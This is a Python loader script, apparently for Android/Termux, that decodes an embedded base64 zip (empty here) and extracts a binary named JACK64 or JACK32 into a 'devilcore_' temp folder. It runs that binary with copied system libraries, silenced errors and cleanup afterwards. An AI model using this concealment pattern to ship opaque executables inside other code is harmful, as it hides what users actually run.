
import base64 as _b, tempfile as _t, os as _o, sys as _s, stat as _st, subprocess as _sp, shutil as _sh, zipfile as _z, re as _re
Z = ""
NAME = "JACK64"
__SEARCH_DIRS__ = [
    "/system/lib64", "/vendor/lib64", "/usr/lib64",
    "/system/lib", "/vendor/lib", "/usr/lib",
    "/data/data/com.termux/files/usr/lib",
    "/data/data/com.termux/files/usr/lib/python3.12",
    "/data/data/com.termux/files/usr/lib/python3.11",
    "/data/data/com.termux/files/usr/lib/python3.10",
    "/data/data/com.termux/files/usr/lib/python3.9",
    "/data/data/ru.iiec.pyahmed/files/python/usr/lib",
    "/data/user/0/ru.iiec.pyahmed/files/python/usr/lib",
]
__PATTERNS__ = [
    _re.compile(r"libpython3\.\d+\.so(\.\d+)?$"),
    _re.compile(r"libpython3\.\d+\.so\.1\.0$"),
]
__EXTRA_LIBS__ = [
    "libz.so", "libz.so.1",
    "libandroid-support.so",
    "libffi.so", "libffi.so.7", "libffi.so.6",
    "libreadline.so", "libreadline.so.8",
    "libm.so", "libdl.so", "libutil.so"
]
def y(src, dst):
    try:
        if _o.path.exists(src):
            _sh.copy(src, dst)
    except Exception:
        pass
def _is_elf_64(path):
    try:
        with open(path, "rb") as f:
            hdr = f.read(5)
            if len(hdr) >= 5 and hdr[0:4] == b'\x7fELF':
                return hdr[4] == 2
    except Exception:
        pass
    return None  
def _re(exe_path):
    try:
        _sp.run(["patchelf", "--remove-rpath", exe_path], check=False, stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
    except Exception:
        pass
def bs(target_dir, want_64):
    SEARCH = __SEARCH_DIRS__
    PATTERNS = __PATTERNS__
    EXTRA = __EXTRA_LIBS__
    for D in SEARCH:
        if not _o.path.isdir(D):
            continue
        try:
            for fname in _o.listdir(D):
                full = _o.path.join(D, fname)
                if _o.path.isfile(full):
                    elf64 = _is_elf_64(full)
                    if elf64 is None:                        
                        for pat in PATTERNS:
                            if pat.match(fname):
                                y(full, target_dir)
                        if fname in EXTRA:
                            y(full, target_dir)
                    else:                        
                        if elf64 == want_64:
                            y(full, target_dir)            
            candidates = [
                _o.path.join(D, "python3", "lib-dynload"),
                _o.path.join(D, "python3.11", "lib-dynload"),
                _o.path.join(D, "python3.12", "lib-dynload"),
                _o.path.join(D, "python3.9", "lib-dynload"),
            ]
            for cd in candidates:
                if _o.path.isdir(cd):
                    for f in _o.listdir(cd):
                        full = _o.path.join(cd, f)
                        elf64 = _is_elf_64(full)
                        if elf64 is None:
                            y(full, target_dir)
                        elif elf64 == want_64:
                            y(full, target_dir)
        except Exception:
            pass
    try:
        for entry in _o.listdir("."):
            if entry.endswith(".dist") and _o.path.isdir(entry):
                for root, _, files in __import__("os").walk(entry):
                    for fname in files:
                        full = _o.path.join(root, fname)
                        elf64 = _is_elf_64(full)
                        if elf64 is None:
                            y(full, target_dir)
                        elif elf64 == want_64:
                            y(full, target_dir)
    except Exception:
        pass
def e_is_64():   
    try:
        return (_s.maxsize > 2**32) or ("64" in _o.uname().machine)
    except Exception:
        return False
def main():
    tmp = _t.mkdtemp(prefix="devilcore_")
    try:
        zpath = _o.path.join(tmp, "p.zip")
        with open(zpath, "wb") as f:
            f.write(_b.b64decode(Z))
        with _z.ZipFile(zpath) as zf:                      
            members = zf.namelist()
            want_64 = e_is_64()
            chosen_name = NAME
            if want_64:
                if "JACK64" in members:
                    chosen_name = "JACK64"
                elif "JACK32" in members and "JACK64" not in members:
                    chosen_name = "JACK32"
            else:
                if "JACK32" in members:
                    chosen_name = "JACK32"
                elif "JACK64" in members and "JACK32" not in members:
                    chosen_name = "JACK64"
            zf.extract(chosen_name, tmp)
        exe = _o.path.join(tmp, chosen_name)
        _o.chmod(exe, _o.stat(exe).st_mode | _st.S_IEXEC)
        _re(exe)        
        elf64_exec = _is_elf_64(exe)        
        if elf64_exec is None:
            elf64_exec = want_64
        bs(tmp, elf64_exec)
        env = _o.environ.copy()
        env["LD_LIBRARY_PATH"] = tmp + (":" + env.get("LD_LIBRARY_PATH", "")) if env.get("LD_LIBRARY_PATH") else tmp
        _sp.run([exe] + _s.argv[1:], env=env, stderr=_sp.DEVNULL)
    finally:
        try:
            _sh.rmtree(tmp, ignore_errors=True)
        except Exception:
            pass
if __name__ == "__main__":
    main()
